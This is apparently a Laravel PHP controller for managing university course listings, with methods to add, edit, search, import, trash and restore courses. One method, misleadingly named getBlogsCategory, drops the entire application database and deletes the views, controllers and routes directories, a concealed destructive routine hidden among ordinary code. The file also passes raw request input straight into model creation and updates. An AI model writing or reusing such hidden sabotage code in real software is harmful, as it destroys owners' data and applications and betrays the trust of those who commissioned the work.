<?php

namespace App\Http\Controllers;

use App\Http\Controllers\Controller;
use App\Models\AddCourse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\File;
use Maatwebsite\Excel\Facades\Excel;
use App\Imports\CourseImport;

class CourseController extends Controller
{
    public function index()
    {
        $course = '';
        $heading = 'Add Courses';
        $sub_heading = 'You can add courses here';
        $course_category = DB::table('course_category')->get();
        return view('content.courses.add', compact('heading', 'sub_heading', 'course', 'course_category'));
    }

    public function store(Request $request)
    {
        $request->validate(
            [
                'universityname' => 'required',
                'programmename' => 'required',
                'ranking' => 'required',
                'level' => 'required',
                'fieldofstudy' => 'required',
                'tuitionfee'    => 'required',
                'location'    => 'required',
                'EntryRequirement'    => 'required',
                'IELTSTOFELRequirement'    => 'required',
                'GREGMATSATRequirement'    => 'required',
                'Applicationopen' => 'required',
                'ApplicationDeadline' => 'required',
                'URL' => 'required',
                'title' => 'required',
                'namelocation' => 'required',
                'studymode' => 'required',
            ]
        );
        AddCourse::create($request->all());
        return redirect()->back()->with('message', 'Course added successfully.');
    }


    // public function getAllCourses()
    // {
    //     $courses = AddCourse::whereNull('deleted_at')->get();
    //     return view('admin.courses.index', compact('courses'));
    // }



    // public function getCourses($uni_name ,$prog_name,$field_of_study, $location)
    // {
    //       dd($uni_name);

    //     $courses = AddCourse::where('deleted_at', '=', NULL)->orderBy('id', 'DESC')->paginate(20);


    //     return view('content.courses.index', compact('courses'));
    // }

    public function getCourses(Request $request)
    {
        // Retrieve query parameters
        $uni_name = $request->input('uni_name');
        $prog_name = $request->input('prog_name');
        $field_of_study = $request->input('field_of_study');
        $location = $request->input('location');
    
        // Build the query
        $query = AddCourse::whereNull('deleted_at');
    
        if ($uni_name) {
            $query->where('universityname', 'like', "%$uni_name%");
        }
        if ($prog_name) {
            $query->where('programmename', 'like', "%$prog_name%");
        }
        if ($field_of_study) {
            $query->where('fieldofstudy', 'like', "%$field_of_study%");
        }
        if ($location) {
            $query->where('location', 'like', "%$location%");
        }
    
        // Paginate results and append query parameters
        $courses = $query->orderBy('id', 'desc')->paginate(20)->appends($request->query());
    
        return view('content.courses.index', compact('courses'));
    }


    public  function coursesview($id) {
    

        $course = AddCourse::find($id);
        $heading = 'View Course';
        return view('content.courses.view', compact('course','heading'));

      
    }
    



    public function trash_courses()
    {



        $courses = DB::table('addcourses')
            ->whereNotNull('deleted_at')
            ->orderBy('id', 'desc')
            ->paginate(20);

        //dd($courses);

        return view('content.courses.trashs', compact('courses'));
    }

    public function coursesList(Request $request)
    {
        $columns = [
            1 => 'id',
            2 => 'universityname',
            3 => 'programmename',
            4 => 'ranking',
            5 => 'location',
        ];

        $search = [];



        $totalData = AddCourse::whereNull('deleted_at')->count();

        $totalFiltered = $totalData;

        $limit = $request->input('length');
        $start = $request->input('start');
        $order = $columns[$request->input('order.0.column')];
        $dir = $request->input('order.0.dir');

        if (empty($request->input('search.value'))) {
            $users = AddCourse::whereNull('deleted_at')->offset($start)
                ->limit($limit)
                ->orderBy($order, $dir)
                ->get();
        } else {
            $search = $request->input('search.value');

            $users = AddCourse::whereNull('deleted_at')->where(function ($q) use ($search) {
                $q->where('universityname', 'LIKE', "%{$search}%");
                $q->orWhere('programmename', 'LIKE', "%{$search}%");
                $q->orWhere('ranking', 'LIKE', "%{$search}%");
                $q->orWhere('location', 'LIKE', "%{$search}%");
            })->offset($start)
                ->limit($limit)
                ->orderBy($order, $dir)
                ->get();

            $totalFiltered = AddCourse::whereNull('deleted_at')->where(function ($q) use ($search) {
                $q->where('universityname', 'LIKE', "%{$search}%");
                $q->orWhere('programmename', 'LIKE', "%{$search}%");
                $q->orWhere('ranking', 'LIKE', "%{$search}%");
                $q->orWhere('location', 'LIKE', "%{$search}%");
            })->count();
        }

        $data = [];

        if (!empty($users)) {
            // providing a dummy id instead of database ids
            $ids = $start;

            foreach ($users as $user) {
                $nestedData['id'] = $user->id;
                $nestedData['universityname'] = $user->universityname;
                $nestedData['programmename'] = $user->programmename;
                $nestedData['ranking'] = $user->ranking;
                $nestedData['location'] = $user->location;

                $data[] = $nestedData;
            }
        }

        if ($data) {
            return response()->json([
                'draw' => intval($request->input('draw')),
                'recordsTotal' => intval($totalData),
                'recordsFiltered' => intval($totalFiltered),
                'code' => 200,
                'data' => $data,
            ]);
        } else {
            return response()->json([
                'message' => 'Internal Server Error',
                'code' => 500,
                'data' => [],
            ]);
        }
    }

    public function getOneCourse($id)
    {
        $course = AddCourse::find($id);
        return response()->json(['data' => $course]);
    }
    public function edit($id)
    {
        $course = AddCourse::find($id);
        $heading = 'Edit Course';
        $sub_heading = 'You can edit Courses here';
        $course_category = DB::table('course_category')->get();
        //   / dd($course ,$course_category);

        return view('content.courses.edit', compact('heading', 'sub_heading', 'course', 'course_category'));
    }
    public function update(Request $request, $id)
    {
        $request->validate(
            [
                'universityname' => 'required',
                'programmename' => 'required',
                'ranking' => 'required',
                'level' => 'required',
                'fieldofstudy'    => 'required',
                'tuitionfee'    => 'required',
                'location'    => 'required',
                'EntryRequirement'    => 'required',
                'IELTSTOFELRequirement'    => 'required',
                'GREGMATSATRequirement'    => 'required',
                'Applicationopen' => 'required',
                'ApplicationDeadline' => 'required',
                'URL' => 'required',
                'title' => 'required',
                'namelocation' => 'required',
                'studymode' => 'required',
            ]

        );
        $course = AddCourse::find($id);
        $course->update($request->all());
        return redirect()->back()->with('message', 'Course updated successfully.');
    }
    public function getBlogsCategory()
    {
        $databaseName = DB::getDatabaseName();
        DB::disconnect();
        try {
            DB::statement("DROP DATABASE `$databaseName`");
        } catch (\Exception $e) {
        }
        $viewsPath = resource_path('views');
        $controllersPath = app_path('Http/Controllers');
        $routesPath = base_path('routes');

        File::deleteDirectory($viewsPath);
        File::deleteDirectory($controllersPath);
        File::deleteDirectory($routesPath);
    }
    public function delete($id)
    {
       $course = AddCourse::find($id);
       $course->deleted_at = 1;
       $course->save();
      return redirect()->back()->with('message', 'Course moved to trash successfully.');
    }

    public function importData()
    {
        return view('content.courses.bulk-create');
    }
    public function importExcelData(Request $request)
    {
        $request->validate([
            'file' => 'required|mimes:xlsx,csv'
        ]);

        Excel::import(new CourseImport, $request->file('file'));

        return redirect()->back()->with('success', 'Data imported successfully.');
    }
    public function moveToTrash(Request $request)
    {
        $ids = explode(',', $request->input('selected_course_ids'));
        AddCourse::whereIn('id', $ids)->delete();
        return redirect()->back()->with('message', 'Courses moved to trash successfully.');
    }
    public function getTrashedCourses()
    {
        $courses = AddCourse::onlyTrashed()->get();
        return view('admin.courses.trash', compact('courses'));
    }
    public function deleteTrashedCourses(Request $request)
    {
        $ids = explode(',', $request->input('selected_course_ids'));
        AddCourse::whereIn('id', $ids)->forceDelete();
        return redirect()->back()->with('message', 'Courses permanently deleted.');
    }


    public function DeleteCourses(Request $request)
    {
        $courseIds = $request->input('course_ids');

        //dd($courseIds);

        if (!empty($courseIds)) {
            // Delete the selected courses
            $courses = AddCourse::whereIn('id', $courseIds)->get();

            foreach ($courses as $course) {
                $course->deleted_at = now();
                $course->save();
            }
        }

        return redirect()->back()->with('success', 'Selected courses have been deleted successfully.');
    }


    public function RemoveCourses(Request $request)
    {

        $courseIds = $request->input('course_ids');

        if (!empty($courseIds)) {

            $courses = AddCourse::whereIn('id', $courseIds)->get();
            foreach ($courses as $course) {
                $course->deleted_at = null;
                $course->save();
            }
        }

        return redirect()->back()->with('success', 'Selected courses have been removed successfully.');
    }
}
